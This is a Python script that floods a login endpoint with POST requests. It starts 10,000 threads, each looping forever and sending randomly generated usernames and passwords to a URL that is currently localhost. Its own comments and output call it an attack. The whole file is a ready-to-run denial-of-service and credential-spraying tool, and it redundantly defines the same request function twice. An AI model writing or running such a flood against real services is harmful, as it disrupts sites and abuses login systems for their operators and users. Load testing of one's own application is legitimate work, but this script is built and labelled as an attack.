import requests
import threading
import random
import string

# target_url = "http://127.0.0.1:5000/login"
target_url = "http://127.0.0.1:5000/"

# Generate random usernames and passwords
def generate_random_credentials():
    #
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    #
    password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^", k=12))
    return {"username": username, "password": password}


# Send HTTP POST request
def send_post_request():
    while True:
        try:
            #
            login_data = generate_random_credentials()
            response = requests.post(target_url, data=login_data)
            print(f"Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")


def send_post_request():
    while True:
        try:
            response = requests.post(target_url, data=generate_random_credentials())
            print(f"Threads: {threading.active_count()} | Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")


# Create multiple threads for the attack
num_threads = 10000  # number of threads
threads = []

for _ in range(num_threads):
    thread = threading.Thread(target=send_post_request)
    thread.start()
    threads.append(thread)

#
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
